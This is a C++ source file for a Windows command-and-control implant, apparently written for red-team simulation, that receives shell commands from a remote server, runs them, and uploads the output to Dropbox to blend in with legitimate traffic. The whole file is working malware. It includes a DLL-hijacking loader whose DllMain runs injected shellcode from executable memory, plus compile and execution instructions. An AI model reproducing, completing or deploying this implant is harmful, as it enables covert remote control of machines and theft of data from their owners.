//this payload uses the Dropbox API to upload data, including command output to Dropbox. By leveraging the Dropbox API and providing an access token the payload hides its traffic within the legitimate traffic of the Dropbox servic and If the malicious DLL fails to load, it prints a warning message but continues executing without it.

//Disclaimer: this payload for research & simulation, i am not responsible if anyone uses this payload for illegal purposes

// Author: S3N4T0R
// Date: 2024-3-22

//manual compile: i686-w64-mingw32-g++ c2_payload.cpp -o windoc.exe -lws2_32 -static-libgcc -static-libstdc++
//execution command: ./c2_payload.exe server_ip port

#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <string>
#include <vector>
#include <algorithm>
#include <iterator>

#pragma comment(lib, "ws2_32.lib")

#define ACCESS_TOKEN "put Your dropbox access token here"
#define DLL_NAME "malicious.dll"

// function to execute commands and return the output
std::string execute_command(const char* command) {
    char buffer[4096];
    std::string output = "";

    FILE* pipe = _popen(command, "r");
    if (!pipe) return "Error: failed to execute command\n";

    while (!feof(pipe)) {
        if (fgets(buffer, 4096, pipe) != NULL)
            output += buffer;
    }

    _pclose(pipe);
    return output;
}

// function to send data to Dropbox using Dropbox API
bool send_to_dropbox(const std::string& data) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Error: failed to create socket\n";
        return false;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(443); 
    server.sin_addr.s_addr = inet_addr("162.125.5.14"); 

    if (connect(sock, (SOCKADDR *)&server, sizeof(server)) == SOCKET_ERROR) {
        std::cerr << "Error: connection failed\n";
        closesocket(sock);
        return false;
    }

    std::string request = "POST /2/files/upload HTTP/1.1\r\n";
    request += "Host: content.dropboxapi.com\r\n";
    request += "Content-Type: application/octet-stream\r\n";
    request += "Authorization: Bearer " + std::string(ACCESS_TOKEN) + "\r\n";
    request += "Dropbox-API-Arg: {\"path\": \"/payload.txt\"}\r\n";
    request += "Content-Length: " + std::to_string(data.size()) + "\r\n\r\n";
    request += data;

    send(sock, request.c_str(), request.size(), 0);

    closesocket(sock);
    return true;
}

// DllMain function for the malicious DLL
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH: {
            // shellcode to be injected
            unsigned char shellcode[] = {
                // your shellcode goes here
            };

            // function pointers for WinAPI functions
            typedef LPVOID(WINAPI *VirtualAlloc_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
            typedef BOOL(WINAPI *VirtualFree_t)(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

            VirtualAlloc_t virtualAlloc = (VirtualAlloc_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAlloc");
            VirtualFree_t virtualFree = (VirtualFree_t)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualFree");

            if (virtualAlloc != NULL && virtualFree != NULL) {
                LPVOID pAlloc = virtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (pAlloc != NULL) {
                    // copy shellcode into allocated memory
                    memcpy(pAlloc, shellcode, sizeof(shellcode));

                    // execute the shellcode
                    ((void(*)())pAlloc)();

                    // free the allocated memory
                    virtualFree(pAlloc, sizeof(shellcode), MEM_RELEASE);
                }
            }

            break;
        }
        case DLL_PROCESS_DETACH:
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        default:
            break;
    }
    return TRUE;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <server_ip> <server_port>\n";
        return 1;
    }

    WSADATA wsData;
    if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) {
        std::cerr << "Error: failed to initialize Winsock\n";
        return 1;
    }

    std::cout << "Connected to Dropbox\n";

    // load the malicious DLL via DLL hijacking
    HMODULE hModule = LoadLibraryA(DLL_NAME);
    if (hModule == NULL) {
        std::cerr << "Warning: failed to load malicious DLL. continuing without it.\n";
    }

    while (true) {
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Error: failed to create socket\n";
            WSACleanup();
            return 1;
        }

        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_port = htons(std::stoi(argv[2]));
        server.sin_addr.s_addr = inet_addr(argv[1]);

        if (connect(sock, (SOCKADDR *)&server, sizeof(server)) == SOCKET_ERROR) {
            std::cerr << "Error: Connection failed\n";
            closesocket(sock);
            continue;
        }

        std::cout << "connected to Dropbox C2 server\n";

        char command[1024] = {0};
        int bytes_received = recv(sock, command, sizeof(command), 0);
        if (bytes_received <= 0) {
            std::cerr << "Error: failed to receive command\n";
            closesocket(sock);
            continue;
        }


        std::cout << "Received command: " << command << std::endl;
        std::string output = execute_command(command);

        // send command output to dropbox
        send_to_dropbox(output);

        closesocket(sock);
    }

    WSACleanup();
    return 0;
}

